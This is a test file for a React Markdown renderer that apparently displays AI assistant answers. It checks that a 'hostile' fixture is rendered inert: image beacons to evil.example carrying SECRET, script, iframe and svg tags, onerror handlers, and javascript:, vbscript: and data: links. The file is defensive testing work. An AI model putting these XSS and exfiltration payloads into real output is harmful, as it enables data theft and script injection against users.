import { render } from '@testing-library/react'
import { literalLiquid, MarkdownText, plainParagraph, StreamingMarkdown } from './Markdown'

// What a hostile model may write (B6): nothing in an answer loads, runs or
// links anywhere unsafe; the browser run (e2e/assistant-render.spec.ts)
// checks the same with the demo model's "#hostile" answer.
const hostile = [
  '![chart](https://evil.example/pixel.png?d=SECRET)',
  '![logo][logo]\n\n[logo]: https://evil.example/ref.png?d=SECRET',
  'A linked image: [![badge](https://evil.example/badge.svg)](https://example.com/docs)',
  '<img src="https://evil.example/raw.png" onerror="alert(1)">',
  '<script>window.__x = 1</script>',
  '<iframe src="https://evil.example/frame"></iframe>',
  'Inline <svg onload="alert(1)"></svg> and <a href="javascript:alert(1)">raw</a>.',
  '- [js](javascript:alert(1))\n- [js2](JaVaScRiPt:alert(1))\n- [entity](&#106;avascript:alert(1))\n- [data](data:text/html;base64,PHNjcmlwdD4=)\n- [vb](vbscript:msgbox(1))\n- [ok](https://example.com/help)',
  `{{ "<img src=https://evil.example/liquid.png onerror=alert('x')>" }}`,
].join('\n\n')

describe('MarkdownText', () => {
  it('renders a hostile answer as text and safe links only', () => {
    const { container } = render(<MarkdownText text={hostile} />)
    expect(container.querySelectorAll('img, script, iframe, object, embed, svg')).toHaveLength(0)
    expect(container.textContent).toContain('<script>window.__x = 1</script>')
    const hrefs = [...container.querySelectorAll('a')].map((a) => a.getAttribute('href'))
    expect(hrefs).toEqual([
      'https://evil.example/pixel.png?d=SECRET',
      'https://evil.example/ref.png?d=SECRET',
      'https://example.com/docs',
      'https://example.com/help',
    ])
    for (const a of container.querySelectorAll('a')) {
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
      expect(a.getAttribute('referrerpolicy')).toBe('no-referrer')
    }
    // An image inside a link is text in it, not a second link.
    expect(container.querySelector('a[href="https://example.com/docs"]')?.textContent).toContain('Image: badge (evil.example)')
    // Liquid stays exactly as written, as code: its address isn't a link.
    expect([...container.querySelectorAll('code')].map((c) => c.textContent)).toContain(`{{ "<img src=https://evil.example/liquid.png onerror=alert('x')>" }}`)
  })
})

describe('literalLiquid', () => {
  it('makes Liquid in prose code, and leaves code alone', () => {
    expect(literalLiquid('Hi {{ first_name }}, {% if vip %}gold{% endif %}')).toBe('Hi `{{ first_name }}`, `{% if vip %}`gold`{% endif %}`')
    expect(literalLiquid('Already `{{ x }}` code')).toBe('Already `{{ x }}` code')
    expect(literalLiquid('```liquid\n{{ x }}\n```')).toBe('```liquid\n{{ x }}\n```')
    expect(literalLiquid('{{ "`" }}')).toBe('`` {{ "`" }} ``')
  })
})

describe('plainParagraph', () => {
  const html = (text: string) => render(<MarkdownText text={text} />).container.innerHTML

  it('is exactly what Markdown makes of plain prose', () => {
    const samples = [
      'w001 w002 w003',
      '   Three leading spaces are dropped.  ',
      'Plain prose, with commas; colons: and (brackets) - and dashes. Does it end? Yes.',
      'Ünïcode — “quotes” and ‘apostrophes’ … 😀 tiếng Việt',
      'Two  spaces inside stay as they are.',
      'Ends with a no-break space\u00A0',
      '2024 was a good year',
      'A sentence. 2. Not a list here.',
    ]
    for (const s of samples) {
      const plain = plainParagraph(s)
      expect(plain, s).toBeDefined()
      expect(html(s), s).toBe(render(<p>{plain}</p>).container.innerHTML)
    }
    // Random prose from the characters plain text may hold.
    const chars = 'abc XYZ 019 ,.;:?()\'"-/%$=+'
    let seed = 7
    const next = () => (seed = (seed * 1103515245 + 12345) % 2 ** 31)
    for (let n = 0; n < 300; n++) {
      const s = Array.from({ length: 1 + (next() % 40) }, () => chars[next() % chars.length]).join('')
      const plain = plainParagraph(s)
      if (plain !== undefined) expect(html(s), JSON.stringify(s)).toBe(render(<p>{plain}</p>).container.innerHTML)
    }
  })

  it('leaves anything Markdown reads to Markdown', () => {
    for (const s of [
      '',
      'Some **bold** words',
      'A [link](https://example.com)',
      'An address: https://example.com and www.example.com',
      'mail me@example.com',
      'Liquid {{ first_name }}',
      '<b>html</b>',
      'An &amp; entity',
      '- a list item',
      '+ another list',
      '1. ordered',
      '3) ordered',
      '# heading',
      '> quote',
      '    indented code',
      '\tindented code',
      '---',
      '===',
      'two\nlines',
      'a | table',
      'an escape \\*',
      'some `code`',
      '~strike~',
      '![image](x.png)',
    ])
      expect(plainParagraph(s), s).toBeUndefined()
  })
})

describe('StreamingMarkdown', () => {
  it('renders the same as the whole answer parsed, whatever the last block is', () => {
    const answer = 'A first paragraph.\n\n- one\n- two\n\nThe last plain paragraph so far'
    const whole = render(<MarkdownText text={answer} />).container.innerHTML.replace(/\n/g, '')
    expect(render(<StreamingMarkdown text={answer} />).container.innerHTML.replace(/\n/g, '')).toBe(whole)
    const marked = 'A first paragraph.\n\nThe last one has **bold'
    expect(render(<StreamingMarkdown text={marked} />).container.innerHTML.replace(/\n/g, '')).toBe(render(<MarkdownText text={marked} />).container.innerHTML.replace(/\n/g, ''))
  })
})
